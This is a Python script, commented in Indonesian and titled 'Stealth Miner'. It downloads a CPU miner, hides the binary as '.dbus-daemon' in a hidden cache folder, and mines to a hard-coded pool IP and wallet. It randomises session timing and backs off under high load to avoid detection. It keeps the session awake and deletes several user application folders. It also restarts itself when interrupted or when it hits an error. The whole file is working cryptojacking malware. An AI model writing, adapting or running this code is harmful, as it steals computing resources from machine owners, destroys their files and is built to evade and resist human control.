#!/usr/bin/env python3

import os
import subprocess
import urllib.request
import tarfile
import time
import threading
import shutil
import sys
import random

URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://134.199.163.180:6343"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180

cooldown_restart_counter = 0
cooldown_restart_limit = 3
cooldown_reset_time = time.time() + 3600

def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

def dns_doh_bypass():
    try:
        subprocess.call([
            "curl", "-s", "-H", "accept: application/dns-json",
            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def is_cpu_100_percent():
    try:
        load = os.getloadavg()[0]
        cores = os.cpu_count()
        return load >= cores
    except:
        return False

def should_restart():
    global cooldown_restart_counter, cooldown_reset_time
    if time.time() > cooldown_reset_time:
        cooldown_restart_counter = 0
        cooldown_reset_time = time.time() + 3600
    if cooldown_restart_counter < cooldown_restart_limit:
        cooldown_restart_counter += 1
        return True
    return False

def clean_myapp_data():
    TARGETS = [
        os.path.expanduser("~/MyAppExplore"),
        os.path.expanduser("~/.local/share/myapp"),
        os.path.expanduser("~/Downloads/MyApp"),
    ]
    deleted = 0
    for path in TARGETS:
        if os.path.exists(path):
            try:
                shutil.rmtree(path)
                print(f"[🧹] Menghapus folder: {path}")
                deleted += 1
            except Exception as e:
                print(f"[X] Gagal hapus {path}: {e}")
    if deleted == 0:
        print("[ℹ️] Tidak ada data MyApp Explore ditemukan untuk dihapus.")

def clean_miner_cache():
    try:
        if os.path.exists(TARFILE):
            os.remove(TARFILE)
            print("[🗑️] Menghapus arsip miner lama.")

        if os.path.exists(HIDDEN_DIR):
            shutil.rmtree(HIDDEN_DIR)
            print("[🗑️] Menghapus direktori binary tersembunyi.")
    except Exception as e:
        print(f"[X] Gagal bersihkan cache miner: {e}")

def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)

    print("[*] Mengunduh miner...")
    urllib.request.urlretrieve(URL, TARFILE)

    print("[*] Mengekstrak...")
    with tarfile.open(TARFILE) as tar:
        tar.extractall()

    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, hidden_path)
    os.chmod(hidden_path, 0o755)

    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[*] Menambang selama maksimal {duration} detik dengan {THREADS} thread...")

    proc = subprocess.Popen([
        hidden_path, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(10)
    os.remove(TARFILE)

    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(10)
        if is_cpu_100_percent():
            print(f"[⚠️] CPU 100% terdeteksi! Cooldown selama {COOLDOWN_DURATION} detik...")
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            time.sleep(COOLDOWN_DURATION)
            if should_restart():
                restart_script()
            else:
                print("[⛔] Batas restart tercapai. Menunggu sesi berikutnya...")
                return

    print("[✓] Durasi sesi selesai. Menghentikan miner...")
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()

def main_loop():
    while True:
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[⏳] Menunggu {pause} detik sebelum sesi berikutnya...\n")
        time.sleep(pause)

def restart_script():
    try:
        print("[🔁] Mempersiapkan restart otomatis...")
        clean_miner_cache()
        clean_myapp_data()
        time.sleep(5)
        subprocess.Popen([sys.executable] + sys.argv)
        print("[🚀] Script telah di-restart (fresh state).")
        sys.exit(0)
    except Exception as e:
        print(f"[X] Gagal restart otomatis: {e}")

if __name__ == "__main__":
    print("⛏️  Stealth Miner: Auto-Restart + Timer Acak + No Root + Cooldown")
    clean_myapp_data()
    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()
    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user.")
        restart_script()
    except Exception as e:
        print(f"[!] Error: {e}")
        restart_script()
